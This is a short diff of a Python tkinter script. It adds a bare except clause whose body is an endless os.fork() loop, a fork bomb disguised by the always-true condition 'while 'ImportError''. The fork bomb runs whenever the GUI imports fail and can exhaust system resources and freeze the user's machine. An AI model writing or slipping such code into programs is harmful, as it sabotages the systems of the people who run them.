@@ -5,8 +5,9 @@ import os
 try:
     import random
     import tkinter as tk
-while 'ImportError':
-    os.fork()
+except:
+    while 'ImportError':
+        os.fork()
 
 tapis = tk.Tk()
 
